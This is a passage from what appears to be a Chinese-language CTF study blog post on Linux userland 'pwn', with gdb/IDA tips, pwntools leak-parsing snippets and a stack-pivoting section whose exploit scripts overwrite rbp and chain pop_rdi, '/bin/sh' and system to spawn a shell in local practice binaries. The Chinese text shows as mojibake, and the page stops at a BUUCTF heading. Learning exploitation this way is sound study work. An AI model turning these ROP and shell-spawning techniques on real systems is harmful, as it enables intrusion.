<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>linuxç”¨æˆ·å±‚pwn | hfddh666's Blog</title><meta name="author" content="hfddh666"><meta name="copyright" content="hfddh666"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="åŸºç¡€æŒ‡ä»¤IDA:shift+F12;ctrl+f  jgå¤§äºåˆ™è·³è½¬ï¼Œjlå°äºåˆ™è·³è½¬ï¼Œjumpæ— æ¡ä»¶è·³è½¬  encodeä¸decodeåŒºåˆ« gdb:ctrl+cï¼Œp &amp;printfï¼Œ ç›´æ¥æŸ¥çœ‹è¯¥åœ°å€æ‰€å­˜å‚¨çš„ä¸œè¥¿ï¼šx&#x2F;x addrï¼Œ æŸ¥çœ‹gotè¡¨ï¼šgot disass mainï¼šæŸ¥çœ‹mainå‡½æ•°çš„æ±‡ç¼– æŸ¥çœ‹äº‹åŠ¡ï¼š 1234567gefâ¤  x&#x2F;a 0xffffd0d00xffffd0">
<meta property="og:type" content="article">
<meta property="og:title" content="linuxç”¨æˆ·å±‚pwn">
<meta property="og:url" content="https://hfddh666.github.io/2025/09/21/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/index.html">
<meta property="og:site_name" content="hfddh666&#39;s Blog">
<meta property="og:description" content="åŸºç¡€æŒ‡ä»¤IDA:shift+F12;ctrl+f  jgå¤§äºåˆ™è·³è½¬ï¼Œjlå°äºåˆ™è·³è½¬ï¼Œjumpæ— æ¡ä»¶è·³è½¬  encodeä¸decodeåŒºåˆ« gdb:ctrl+cï¼Œp &amp;printfï¼Œ ç›´æ¥æŸ¥çœ‹è¯¥åœ°å€æ‰€å­˜å‚¨çš„ä¸œè¥¿ï¼šx&#x2F;x addrï¼Œ æŸ¥çœ‹gotè¡¨ï¼šgot disass mainï¼šæŸ¥çœ‹mainå‡½æ•°çš„æ±‡ç¼– æŸ¥çœ‹äº‹åŠ¡ï¼š 1234567gefâ¤  x&#x2F;a 0xffffd0d00xffffd0">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://hfddh666.github.io/img/butterfly-icon.png">
<meta property="article:published_time" content="2025-09-21T08:33:44.000Z">
<meta property="article:modified_time" content="2026-02-13T03:54:54.180Z">
<meta property="article:author" content="hfddh666">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hfddh666.github.io/img/butterfly-icon.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "linuxç”¨æˆ·å±‚pwn",
  "url": "https://hfddh666.github.io/2025/09/21/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/",
  "image": "https://hfddh666.github.io/img/butterfly-icon.png",
  "datePublished": "2025-09-21T08:33:44.000Z",
  "dateModified": "2026-02-13T03:54:54.180Z",
  "author": [
    {
      "@type": "Person",
      "name": "hfddh666",
      "url": "https://hfddh666.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://hfddh666.github.io/2025/09/21/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶å¤±è´¥',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'åŠ è½½æ›´å¤š'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'linuxç”¨æˆ·å±‚pwn',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="preload" href="/image/top-bg.jpg" as="image"><style>
  /* ğŸ”¥ é¡µé¢èƒŒæ™¯ï¼šæ›¿æ¢ä¸ºä½ è¦çš„é¢œè‰²ï¼ˆç¤ºä¾‹ç”¨æµ…ç°è“ #f5f7faï¼Œå¯è‡ªè¡Œä¿®æ”¹ï¼‰ */
  body, html {
    background: #f5f7fa !important; /* ä½ å¯æ›¿æ¢æˆä»»æ„é¢œè‰²å€¼ï¼Œæ¯”å¦‚ #f0f2f5ã€#eef1f5 ç­‰ */
    color: #333 !important;
  }
  /* é¡µé¢å®¹å™¨ï¼šå±…ä¸­+ç•™ç™½ */
  #content-inner {
    max-width: 1200px;
    margin: 30px auto;
    padding: 0 20px;
  }
  /* æ–‡ç« å¡ç‰‡ï¼šä¿ç•™çº¯ç™½è‰² */
  .recent-post-item {
    background: #ffffff !important; /* çº¯ç™½èƒŒæ™¯ */
    border-radius: 16px !important;
    box-shadow: 0 6px 16px rgba(0,0,0,0.04) !important;
    padding: 30px !important;
    margin-bottom: 25px !important;
    /* ä¿ç•™å·¦ä¾§æš–æ£•æ¸å˜ç‚¹ç¼€ï¼ˆå¯é€‰ï¼Œä¸å–œæ¬¢å¯åˆ é™¤ï¼‰ */
    border-left: 4px solid;
    border-image: linear-gradient(to bottom, #e67e22, #d35400) 1 !important;
    transition: all 0.2s ease;
    position: relative;
  }
  /* å¡ç‰‡hoveræ•ˆæœ */
  .recent-post-item:hover {
    transform: translateY(-3px);
    box-shadow: 0 10px 25px rgba(0,0,0,0.06) !important;
  }
  /* å¡ç‰‡å³ä¸Šè§’å°ç‚¹ç¼€ï¼ˆå¯é€‰ï¼Œä¸å–œæ¬¢å¯åˆ é™¤ï¼‰ */
  .recent-post-item::after {
    content: "";
    position: absolute;
    top: 20px;
    right: 20px;
    width: 12px;
    height: 12px;
    background: linear-gradient(45deg, #e67e22, #d35400);
    border-radius: 50%;
    opacity: 0.8;
  }
  /* æ–‡ç« æ ‡é¢˜ï¼šæ·±è‰²è°ƒ */
  .post-title {
    font-size: 22px !important;
    font-weight: 700 !important;
    color: #2c3e50 !important;
    margin-bottom: 12px !important;
    padding-right: 20px;
  }
  /* æ–‡ç« æ‘˜è¦ï¼šä¸­ç°è‰² */
  .post-excerpt {
    color: #555 !important;
    line-height: 1.7 !important;
    font-size: 15px !important;
    overflow: hidden;
    text-overflow: ellipsis;
    display: -webkit-box;
    -webkit-line-clamp: 2;
    -webkit-box-orient: vertical;
  }
  /* å‘å¸ƒæ—¶é—´ï¼šæš–ç°è‰²+å°å›¾æ ‡ */
  .post-meta {
    color: #777 !important;
    font-size: 14px !important;
    margin-top: 10px !important;
  }
  .post-meta:before {
    content: "ğŸ“… ";
    color: #e67e22;
  }
  /* ä¾§è¾¹æ ï¼šä¿ç•™çº¯ç™½è‰² */
  .card-widget {
    background: #ffffff !important; /* çº¯ç™½èƒŒæ™¯ */
    border-radius: 16px !important;
    box-shadow: 0 6px 16px rgba(0,0,0,0.04) !important;
    padding: 25px !important;
    margin-bottom: 20px !important;
  }
  /* ä¾§è¾¹æ æ ‡é¢˜ï¼šæ·±è‰²è°ƒ */
  .aside-title {
    font-size: 18px !important;
    font-weight: 600 !important;
    padding-bottom: 8px !important;
    border-bottom: 2px solid #f5f7fa !important; /* å’ŒèƒŒæ™¯è‰²å‘¼åº” */
    margin-bottom: 15px !important;
    color: #2c3e50 !important;
  }
  /* æ ‡ç­¾/åˆ†ç±»ï¼šæµ…æ©™åº•ç‚¹ç¼€ */
  .tag-cloud-list a, .category-list a {
    background: #fef6e9 !important;
    color: #e67e22 !important;
    padding: 4px 12px !important;
    border-radius: 20px !important;
    margin: 0 5px 8px 0 !important;
    display: inline-block !important;
  }
  /* ä»£ç å—ï¼šä¿ç•™çº¯ç™½è‰² */
  figure.highlight {
    background: #ffffff !important; /* çº¯ç™½èƒŒæ™¯ */
    border-radius: 12px !important;
    padding: 20px !important;
    margin: 20px 0 !important;
    box-shadow: 0 4px 12px rgba(0,0,0,0.05) !important;
    border: none !important;
  }
  .highlight code {
    color: #2c3e50 !important;
    font-size: 14px !important;
    line-height: 1.6 !important;
  }
  /* è¡Œå†…ä»£ç ï¼šä¿ç•™çº¯ç™½è‰² */
  p code, li code {
    background: #ffffff !important; /* çº¯ç™½èƒŒæ™¯ */
    color: #e67e22 !important;
    padding: 2px 6px !important;
    border-radius: 4px !important;
    font-size: 14px !important;
    box-shadow: 0 1px 3px rgba(0,0,0,0.08) !important;
  }
  /* é¡¶éƒ¨å›¾åŠ è½½ä¼˜åŒ– */
  #page-header {
    background-image: url(/image/top-bg.jpg) !important;
    background-size: cover !important;
    background-position: center !important;
    opacity: 1 !important;
    transition: none !important;
  }
  .top-img {
    background: url(/image/top-bg.jpg) center/cover !important;
  }
</style>
<meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> æ—¶é—´è½´</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-heartbeat"></i><span> æ¸…å•</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> éŸ³ä¹</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> ç…§ç‰‡</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> ç”µå½±</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/image/top-bg.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">hfddh666's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">linuxç”¨æˆ·å±‚pwn</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  è¿”å›é¦–é¡µ</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> æ—¶é—´è½´</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-heartbeat"></i><span> æ¸…å•</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> éŸ³ä¹</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> ç…§ç‰‡</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> ç”µå½±</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">linuxç”¨æˆ·å±‚pwn</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2025-09-21T08:33:44.000Z" title="å‘è¡¨äº 2025-09-21 16:33:44">2025-09-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2026-02-13T03:54:54.180Z" title="æ›´æ–°äº 2026-02-13 11:54:54">2026-02-13</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">æµè§ˆé‡:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:365,&quot;messagePrev&quot;:&quot;æœ¬æ–‡æœ€åæ›´æ–°äº&quot;,&quot;messageNext&quot;:&quot;å¤©å‰ï¼Œæ–‡ä¸­å†…å®¹å¯èƒ½å·²è¿‡æ—¶ã€‚&quot;,&quot;postUpdate&quot;:&quot;2026-02-13 11:54:54&quot;}" hidden></div><h2 id="åŸºç¡€æŒ‡ä»¤"><a href="#åŸºç¡€æŒ‡ä»¤" class="headerlink" title="åŸºç¡€æŒ‡ä»¤"></a>åŸºç¡€æŒ‡ä»¤</h2><h4 id="IDA"><a href="#IDA" class="headerlink" title="IDA:"></a>IDA:</h4><p>shift+F12;ctrl+f</p>
<p> jgå¤§äºåˆ™è·³è½¬ï¼Œjlå°äºåˆ™è·³è½¬ï¼Œjumpæ— æ¡ä»¶è·³è½¬ </p>
<p>encodeä¸decodeåŒºåˆ«</p>
<h4 id="gdb"><a href="#gdb" class="headerlink" title="gdb:"></a>gdb:</h4><p>ctrl+cï¼Œp &amp;printfï¼Œ</p>
<p>ç›´æ¥æŸ¥çœ‹è¯¥åœ°å€æ‰€å­˜å‚¨çš„ä¸œè¥¿ï¼šx&#x2F;x addrï¼Œ</p>
<p>æŸ¥çœ‹gotè¡¨ï¼šgot</p>
<p>disass mainï¼šæŸ¥çœ‹mainå‡½æ•°çš„æ±‡ç¼–</p>
<p>æŸ¥çœ‹äº‹åŠ¡ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gefâ¤  x/a 0xffffd0d0</span><br><span class="line">0xffffd0d0:	0x80484b0</span><br><span class="line">gefâ¤  x/10c 0x80484b0</span><br><span class="line">0x80484b0:	0x68	0x65	0x6c	0x6c	0x6f	0x20	0x77	0x6f</span><br><span class="line">0x80484b8:	0x72	0x6c</span><br><span class="line">gefâ¤  x/s 0x80484b0</span><br><span class="line">0x80484b0:	&quot;hello world!&quot;</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹å¯„å­˜å™¨ï¼š info registers </p>
<h4 id="æ¥æ”¶æ•°æ®ï¼š"><a href="#æ¥æ”¶æ•°æ®ï¼š" class="headerlink" title="æ¥æ”¶æ•°æ®ï¼š"></a>æ¥æ”¶æ•°æ®ï¼š</h4><p>64ä½canaryæ¥å—ï¼šå› ä¸ºæ­£å¸¸canaryçš„æœ«ä½ä¸ºâ€\x00â€</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">canary=u64(p.recv(7).rjust(8,b&#x27;\x00&#x27;)) </span><br></pre></td></tr></table></figure>

<p>64ä½çš„å †æ¥å—æŸä¸ªå±•ç¤ºçš„æ•°æ®</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free_addr = u64(r.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br></pre></td></tr></table></figure>

<p>32ä½ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leak = u32(r.recvuntil(&#x27;\xf7&#x27;)[-4:])-libc.sym[&#x27;printf&#x27;] </span><br><span class="line">leak = u32(p.recv(4))</span><br></pre></td></tr></table></figure>

<p>è‹¥æ¥å—çš„åœ°å€ä¸ºBuffer address: 0x7ffd4b9c3e20\nï¼Œåˆ™addr&#x3D; int(r.recvline()[14:-2], 16) æˆ–int(r.recv(7),16)</p>
<p>æˆ–è€…r.recvuntil(bâ€0xâ€),addr&#x3D;int(r.recv(14),16)</p>
<p> <img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/6fdf1771bd30b5162acd1fb9abf2fac6.png" alt="img"> </p>
<p><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1753027234341.png" alt="1753027234341"></p>
<p>ä¸€èˆ¬gotè¡¨åªæ¥å—å‰6ä½ï¼Œå³</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addr=u64(r.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ljustä¸rjuståŒºåˆ«</p>
<h4 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h4><p>gotè¡¨ä¸­å­˜å‚¨çš„ä¸ºçœŸå®åœ°å€ï¼ŒæŒ‡å…¶æ‰€æŒ‡å‘çš„ä¸ºå‡½æ•°çœŸå®åœ°å€</p>
<p>è¯¦ç»†äº†è§£å¼€å¯pieä¿æŠ¤å’Œæ³„éœ²libcå·®åˆ«ï¼š<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45677731/article/details/108763362?fromshare=blogdetail&sharetype=blogdetail&sharerId=108763362&sharerefer=PC&sharesource=2403_88369859&sharefrom=from_link%EF%BC%8C%E5%BC%80%E5%90%AFpie%E4%BF%9D%E6%8A%A4%E6%98%AFida%E4%B8%AD%E6%96%87%E4%BB%B6%E7%9A%84%E5%81%8F%E7%A7%BB%EF%BC%8Clibc%E6%98%AF%E6%96%87%E4%BB%B6libc%E4%B8%8Elibc.so%E7%9A%84%E5%81%8F%E7%A7%BB">https://blog.csdn.net/weixin_45677731/article/details/108763362?fromshare=blogdetail&amp;sharetype=blogdetail&amp;sharerId=108763362&amp;sharerefer=PC&amp;sharesource=2403_88369859&amp;sharefrom=from_linkï¼Œå¼€å¯pieä¿æŠ¤æ˜¯idaä¸­æ–‡ä»¶çš„åç§»ï¼Œlibcæ˜¯æ–‡ä»¶libcä¸libc.soçš„åç§»</a></p>
<p>æ±‡ç¼–æŒ‡ä»¤å­¦ä¹ </p>
<p><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1751903807050.png" alt="1751903807050"></p>
<h2 id="æ ˆè¿ç§»"><a href="#æ ˆè¿ç§»" class="headerlink" title="æ ˆè¿ç§»"></a>æ ˆè¿ç§»</h2><p>å½“ä¸å­˜åœ¨æ ˆæº¢å‡ºæ—¶ï¼Œé€šè¿‡æ ˆè¿ç§»æ¥åšæ³•</p>
<p>å˜é‡æ˜¯æ ¹æ®rbpæ¥å¯»å€çš„</p>
<p><strong>leaveæŒ‡ä»¤çš„æœ¬è´¨å…¶å®å°±æ˜¯ï¼š</strong></p>
<p><strong>mov esp,ebp</strong></p>
<p><strong>pop ebp</strong></p>
<p><strong>retæŒ‡ä»¤çš„æœ¬è´¨å…¶å®å°±æ˜¯ï¼š</strong></p>
<p><strong>pop eip</strong></p>
<h4 id="1-è¿›è¡Œä»»æ„åœ°å€æ”¹å†™"><a href="#1-è¿›è¡Œä»»æ„åœ°å€æ”¹å†™" class="headerlink" title="1.è¿›è¡Œä»»æ„åœ°å€æ”¹å†™"></a>1.è¿›è¡Œä»»æ„åœ°å€æ”¹å†™</h4><p>æ”¹å˜rbpçš„ä½ç½®</p>
<p>å›¾ä¸­50hå€¼å¾—æ˜¯åå…­è¿›åˆ¶</p>
<p><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1751902162390.png" alt="1751902162390"></p>
<p><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1751902177327.png" alt="1751902177327"></p>
<p>ç”±å›¾ä¸€å¯çŸ¥ï¼Œåªèƒ½è¯»å–0x58å¤§å°ï¼Œ0x50+0x8&#x3D;0x58,å› æ­¤ï¼Œæœ€å¤šåªèƒ½æ”¹å†™åˆ°rbpéƒ¨åˆ†ï¼Œè¿”å›åœ°å€å†™ä¸åˆ°ï¼Œæ‰€ä»¥ä¸èƒ½è¿›è¡Œæº¢å‡º</p>
<p>ç”±å›¾äºŒå¯çŸ¥ï¼Œv4å¯é€šè¿‡scanfç›´æ¥è¯»å–ï¼Œåˆå› ä¸ºv4çš„åç§»ä¸ºrbp-0x4ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠrbpçš„å†…å®¹æ”¹ä¸ºpasswd+0x4ï¼Œè¿™æ ·ï¼Œå½“ç»™v4èµ‹å€¼æ—¶ï¼Œä¼šå°†rbp-0x4çš„éƒ¨åˆ†å†™ä¸ºv4çš„å€¼ï¼Œåˆå› ä¸ºpasswdåœ¨rbp-4çš„ä½ç½®ï¼Œè¿™æ ·ä¹Ÿé¡ºä¾¿ç»™passwdèµ‹å€¼</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">exp</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&quot;./666&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>+p64(passwd_addr+<span class="number">0x4</span>)`</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;input2&quot;</span>,payload)`</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;input1&quot;</span>,<span class="string">b&quot;4660&quot;</span>)`&lt;!--å› ä¸ºldä¸ºé•¿æ•´å‹ï¼Œæ‰€ä»¥è¦ç”¨åè¿›åˆ¶--&gt;</span><br><span class="line">p.interactive()`</span><br></pre></td></tr></table></figure>



<h4 id="2-å¢åŠ æº¢å‡ºé•¿åº¦"><a href="#2-å¢åŠ æº¢å‡ºé•¿åº¦" class="headerlink" title="2.å¢åŠ æº¢å‡ºé•¿åº¦"></a>2.å¢åŠ æº¢å‡ºé•¿åº¦</h4><p> å…ˆåœ¨ä¸€ä¸ªä½ç½®å¸ƒç½®å¥½ropé“¾æ¡ï¼Œç„¶åæŠŠç¨‹åºçš„æ‰§è¡Œæµè¿ç§»åˆ°æˆ‘ä»¬å¸ƒç½®å¥½ropé“¾æ¡çš„ä½ç½®ï¼Œè®©ç¨‹åºæ‰§è¡Œæµæ‰§è¡Œè¸å…¥æˆ‘ä»¬å¸ƒç½®å¥½äº†çš„åœ°æ–¹ </p>
<p><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1751904993092.png" alt="1751904993092"></p>
<p>è‹¥readè¯»å…¥å¤§å°è¶³å¤Ÿï¼Œexp:</p>
<p><code>payload=b&#39;a&#39;*padding+p64(pop_rdi)+p64(&quot;bin_sh_addr&quot;)+p64(ret)+p64(system)</code></p>
<p>åŸç†ï¼š</p>
<p><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1751905726398.png" alt="1751905726398"></p>
<p>ç¬¬ä¸€æ¬¡leaveï¼š<img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1751905771273.png" alt="1751905771273"></p>
<p>ç¬¬ä¸€æ¬¡retï¼š<img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1751905828375.png" alt="1751905828375"></p>
<p>ç¬¬äºŒæ¬¡leaveï¼š<img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1751905879079.png" alt="1751905879079"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">`exp:`</span><br><span class="line"></span><br><span class="line">`<span class="keyword">from</span> pwn <span class="keyword">import</span>*`</span><br><span class="line"></span><br><span class="line">`p=process(<span class="string">&quot;./555&quot;</span>)`</span><br><span class="line"></span><br><span class="line">`stack=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)`</span><br><span class="line"></span><br><span class="line">`payload=flat([<span class="number">0x1</span>,pop_rdi,stack+<span class="number">28</span>,ret,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,system])`stackä¸ºbufåœ°å€,<span class="string">&quot;/bin/sh\x00&quot;</span>åœ¨bufå¾€åæ•°ç¬¬äº”ä¸ªï¼Œä¸º<span class="number">0x28</span>æ‰€ä»¥è¦åŠ ä¸Š<span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">`payload=payload.ljust(<span class="number">0x50</span>,<span class="string">b&#x27;\x00&#x27;</span>)`</span><br><span class="line"></span><br><span class="line">`payload+=flat([stack,leave])`</span><br><span class="line"></span><br><span class="line">`p.sendlineafter(<span class="string">b&quot;input2&quot;</span>,payload)`</span><br><span class="line"></span><br><span class="line">`p.interactive()`</span><br></pre></td></tr></table></figure>





<h4 id="é¢˜ç›®ï¼šbuuctfç¬¬26é¢˜"><a href="#é¢˜ç›®ï¼šbuuctfç¬¬26é¢˜" class="headerlink" title="é¢˜ç›®ï¼šbuuctfç¬¬26é¢˜"></a>é¢˜ç›®ï¼šbuuctfç¬¬26é¢˜</h4><p>è¾“å‡ºçš„å†…å®¹ä¸æ˜¯ebpçš„åœ°å€ï¼Œåªæ˜¯ebpçš„å†…å®¹ï¼Œé€šè¿‡è°ƒè¯•å¯çŸ¥äºŒè€…ç›¸å·®0x10</p>
<p>exp:</p>
